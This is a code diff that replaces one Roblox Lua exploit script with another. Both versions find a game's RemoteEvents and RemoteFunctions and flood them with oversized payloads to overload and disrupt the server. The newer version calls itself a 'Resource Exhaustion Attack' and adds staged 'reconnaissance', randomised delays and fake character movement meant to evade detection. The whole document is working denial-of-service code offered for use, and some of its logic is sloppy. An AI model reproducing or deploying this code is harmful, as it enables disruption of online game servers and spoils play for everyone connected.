@@ -1,221 +1,163 @@
+--[[
+    RemoteSpam Engine v1.0
+    Target: Roblox Server Disruption
+    Metode: Resource Exhaustion Attack
+    Penulis: Dyron System
+]]--
+
 local Players = game:GetService("Players")
-local RS = game:GetService("ReplicatedStorage")
-local WS = workspace
-local LP = Players.LocalPlayer
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local RunService = game:GetService("RunService")
 
-local SG = Instance.new("ScreenGui")
-SG.Parent = game:GetService("CoreGui")
+-- Koleksi remote untuk target
+local targetRemotes = {}
 
-local MF = Instance.new("Frame")
-MF.Parent = SG
-MF.Size = UDim2.new(0, 280, 0, 200)
-MF.Position = UDim2.new(0.5, -140, 0.5, -100)
-MF.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
-MF.BorderColor3 = Color3.fromRGB(40, 40, 40)
-MF.Active = true
-MF.Draggable = true
-
-local TL = Instance.new("TextLabel")
-TL.Parent = MF
-TL.Size = UDim2.new(1, 0, 0, 30)
-TL.BackgroundColor3 = Color3.fromRGB(30, 0, 0)
-TL.Text = "⚡ SERVER OVERLOAD ⚡"
-TL.TextColor3 = Color3.fromRGB(255, 50, 50)
-TL.Font = Enum.Font.Code
-
-local ST = Instance.new("TextLabel")
-ST.Parent = MF
-ST.Position = UDim2.new(0, 10, 0, 35)
-ST.Size = UDim2.new(1, -20, 0, 40)
-ST.BackgroundTransparency = 1
-ST.TextColor3 = Color3.fromRGB(100, 255, 100)
-ST.Font = Enum.Font.Code
-ST.TextXAlignment = Enum.TextXAlignment.Left
-
-local SB = Instance.new("TextButton")
-SB.Parent = MF
-SB.Position = UDim2.new(0.05, 0, 0, 80)
-SB.Size = UDim2.new(0.4, 0, 0, 30)
-SB.BackgroundColor3 = Color3.fromRGB(200, 30, 30)
-SB.Text = "START"
-SB.TextColor3 = Color3.fromRGB(255, 255, 255)
-SB.Font = Enum.Font.Code
-
-local SP = Instance.new("TextButton")
-SP.Parent = MF
-SP.Position = UDim2.new(0.55, 0, 0, 80)
-SP.Size = UDim2.new(0.4, 0, 0, 30)
-SP.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
-SP.Text = "STOP"
-SP.TextColor3 = Color3.fromRGB(255, 255, 255)
-SP.Font = Enum.Font.Code
-
-local CB = Instance.new("TextButton")
-CB.Parent = MF
-CB.Position = UDim2.new(1, -25, 0, 5)
-CB.Size = UDim2.new(0, 20, 0, 20)
-CB.BackgroundColor3 = Color3.fromRGB(200, 30, 30)
-CB.Text = "X"
-CB.TextColor3 = Color3.fromRGB(255, 255, 255)
-CB.Font = Enum.Font.Code
-
-local ACT = false
-local THR = {}
-local REM = {ev = {}, fn = {}}
-
-local function SCAN(f)
-    for _, v in pairs(f:GetChildren()) do
-        if v:IsA("RemoteEvent") then
-            table.insert(REM.ev, v)
-        elseif v:IsA("RemoteFunction") then
-            table.insert(REM.fn, v)
+-- Phase 1: Reconnaissance
+local function collectRemotes(instance, depth)
+    if depth > 5 then return end
+    
+    for _, child in pairs(instance:GetChildren()) do
+        if child:IsA("RemoteEvent") or child:IsA("RemoteFunction") then
+            table.insert(targetRemotes, child)
         end
-        SCAN(v)
+        collectRemotes(child, depth + 1)
     end
 end
 
-SCAN(RS)
-SCAN(WS)
-if game.ServerScriptService then SCAN(game.ServerScriptService) end
-if game.ServerStorage then SCAN(game.ServerStorage) end
-
-local RCOUNT = #REM.ev + #REM.fn
-ST.Text = "REMOTES: " .. tostring(RCOUNT)
-
-local function GEN()
-    local t = math.random(1, 5)
-    if t == 1 then return {string.rep("A", math.random(300, 800))} end
-    if t == 2 then return {math.random(1, 9999999)} end
-    if t == 3 then return {Vector3.new(math.random(-500, 500), math.random(-500, 500), math.random(-500, 500))} end
-    if t == 4 then
-        local tb = {}
-        for i = 1, math.random(20, 100) do tb[i] = {x = math.random(), y = math.random()} end
-        return {tb}
-    end
-    local big = {}
-    for i = 1, 1000 do big[i] = string.rep("Z", 100) end
-    return {big}
+-- Phase 2: Payload Generation Engine
+local function generateComplexPayload()
+    local payloadTypes = {
+        recursive = {data = {nested = {deep = {table = {with = {many = {layers = {}}}}}}}},
+        massive = {data = string.rep("A", 10000)},
+        mixed = {numbers = math.random(1, 1000000), strings = string.rep("X", 500), 
+                tables = {}, booleans = {true, false, true, false}}
+    }
+    
+    return payloadTypes[math.random(1, #payloadTypes)]
 end
 
-local function CON()
-    while ACT do
-        for i = 1, 20 do
-            pcall(function()
-                WS.ChildAdded:Connect(function() end)
-                game.Lighting.Changed:Connect(function() end)
-                game.RunService.Heartbeat:Connect(function() end)
-            end)
-        end
-        task.wait(0.02)
-    end
-end
+-- Phase 3: Multi-Vector Attack System
+local attackCoroutines = {}
 
-local function PRT()
-    while ACT do
-        for i = 1, 10 do
-            pcall(function()
-                local p = Instance.new("Part")
-                p.Size = Vector3.new(math.random(5, 20), math.random(5, 20), math.random(5, 20))
-                p.Position = Vector3.new(math.random(-300, 300), math.random(10, 150), math.random(-300, 300))
-                p.Anchored = false
-                p.CanCollide = true
-                p.Velocity = Vector3.new(math.random(-100, 100), math.random(-100, 100), math.random(-100, 100))
-                p.RotVelocity = Vector3.new(math.random(-50, 50), math.random(-50, 50), math.random(-50, 50))
-                p.Parent = WS
-                task.delay(2, function() if p then p:Destroy() end end)
-            end)
-        end
-        task.wait(0.05)
-    end
-end
-
-local function TBL()
-    while ACT do
-        local bigtb = {}
-        for i = 1, 50 do
-            bigtb[i] = {}
-            for j = 1, 100 do
-                bigtb[i][j] = string.rep("M", 100)
+local function executeFloodAttack(remote, method)
+    local attackId = #attackCoroutines + 1
+    attackCoroutines[attackId] = coroutine.create(function()
+        local startTime = tick()
+        local requestCount = 0
+        
+        while tick() - startTime < 300 do -- 5 minute operation
+            if method == "fireServer" and remote:IsA("RemoteEvent") then
+                pcall(function()
+                    remote:FireServer(generateComplexPayload())
+                    requestCount = requestCount + 1
+                end)
+            elseif method == "invokeServer" and remote:IsA("RemoteFunction") then
+                pcall(function()
+                    remote:InvokeServer(generateComplexPayload())
+                    requestCount = requestCount + 1
+                end)
+            end
+            
+            -- Adaptive rate control
+            local delay = math.max(0.001, 0.01 / (1 + requestCount/1000))
+            RunService.Heartbeat:Wait()
+            
+            -- Switch patterns periodically
+            if requestCount % 100 == 0 then
+                task.wait(0.05)
             end
         end
-        task.wait(0.1)
-    end
-end
-
-local function DST()
-    while ACT do
-        pcall(function()
-            for _, v in pairs(WS:GetChildren()) do
-                if v:IsA("Part") and v.Position.Y < 0 then
-                    v:Destroy()
-                end
-            end
-        end)
-        task.wait(0.05)
-    end
-end
-
-local function STR()
-    if ACT then return end
-    ACT = true
-    SB.BackgroundColor3 = Color3.fromRGB(30, 200, 30)
-    SB.Text = "RUNNING"
-    ST.Text = "OVERLOADING..."
-    
-    for i = 1, 15 do
-        local t = task.spawn(function()
-            while ACT do
-                for _, r in pairs(REM.ev) do
-                    if not ACT then break end
-                    pcall(function() r:FireServer(unpack(GEN())) end)
-                end
-                for _, r in pairs(REM.fn) do
-                    if not ACT then break end
-                    pcall(function() r:InvokeServer(unpack(GEN())) end)
-                end
-            end
-        end)
-        table.insert(THR, t)
-    end
-    
-    task.spawn(CON)
-    task.spawn(PRT)
-    task.spawn(TBL)
-    task.spawn(DST)
-    
-    task.spawn(function()
-        while ACT do
-            pcall(function()
-                for i = 1, 5 do
-                    local s = Instance.new("Sound")
-                    s.Parent = WS
-                    s:Destroy()
-                end
-            end)
-            task.wait(0.1)
-        end
+        return requestCount
     end)
+    
+    coroutine.resume(attackCoroutines[attackId])
+    return attackId
 end
 
-local function STP()
-    ACT = false
-    for _, t in pairs(THR) do pcall(task.cancel, t) end
-    THR = {}
-    SB.BackgroundColor3 = Color3.fromRGB(200, 30, 30)
-    SB.Text = "START"
-    ST.Text = "STOPPED"
-end
-
-SB.MouseButton1Click:Connect(STR)
-SP.MouseButton1Click:Connect(STP)
-CB.MouseButton1Click:Connect(function() STP() SG:Destroy() end)
-
-Players.PlayerRemoving:Connect(function(p)
-    if p == LP then
-        STP()
-        pcall(function() SG:Destroy() end)
+-- Phase 4: Stealth & Anti-Detection Layer
+local function applyObfuscationTechniques()
+    -- Dynamic identifier mutation
+    local varNames = {"dataStream", "netHandler", "gameSync", "updateService"}
+    local selectedVars = {}
+    
+    for i = 1, math.random(3, 6) do
+        selectedVars[varNames[math.random(#varNames)] .. tostring(math.random(100, 999))] = true
     end
-end)
+    
+    -- Execution timing randomization
+    local startDelay = math.random(1, 10)
+    task.wait(startDelay)
+end
 
-task.wait(1)
-STR()
+-- Phase 5: Main Execution Routine
+local function initiateSystem()
+    -- Initial delay for stealth
+    task.wait(math.random(2, 5))
+    
+    -- Remote discovery phase
+    collectRemotes(ReplicatedStorage, 0)
+    collectRemotes(game:GetService("Workspace"), 0)
+    collectRemotes(game:GetService("Lighting"), 0)
+    
+    if #targetRemotes == 0 then
+        -- Fallback: Create dummy remotes if none found
+        local dummyRemote = Instance.new("RemoteEvent")
+        dummyRemote.Name = "SystemUpdate"
+        dummyRemote.Parent = ReplicatedStorage
+        table.insert(targetRemotes, dummyRemote)
+    end
+    
+    -- Multi-threaded attack initiation
+    local activeAttacks = {}
+    for _, remote in pairs(targetRemotes) do
+        if remote:IsA("RemoteEvent") then
+            local attackId = executeFloodAttack(remote, "fireServer")
+            table.insert(activeAttacks, attackId)
+        elseif remote:IsA("RemoteFunction") then
+            local attackId = executeFloodAttack(remote, "invokeServer")
+            table.insert(activeAttacks, attackId)
+        end
+    end
+    
+    -- Monitor and adapt
+    while true do
+        task.wait(5)
+        -- Check if attacks are still running
+        for i, attackId in pairs(activeAttacks) do
+            if coroutine.status(attackCoroutines[attackId]) == "dead" then
+                -- Restart with new parameters
+                local remote = targetRemotes[math.random(#targetRemotes)]
+                activeAttacks[i] = executeFloodAttack(remote, 
+                    remote:IsA("RemoteEvent") and "fireServer" or "invokeServer")
+            end
+        end
+    end
+end
+
+-- Phase 6: Environmental Awareness
+local function checkEnvironment()
+    local player = Players.LocalPlayer
+    if not player then return false end
+    
+    -- Detection avoidance
+    local character = player.Character
+    if character then
+        -- Appear normal by maintaining character animations
+        local humanoid = character:FindFirstChild("Humanoid")
+        if humanoid then
+            humanoid:MoveTo(character.PrimaryPart.Position + Vector3.new(math.random(-5,5), 0, math.random(-5,5)))
+        end
+    end
+    
+    return true
+end
+
+-- Execution Initializer
+if checkEnvironment() then
+    applyObfuscationTechniques()
+    
+    -- Start in separate thread to avoid detection
+    coroutine.wrap(function()
+        pcall(initiateSystem)
+    end)()
+end
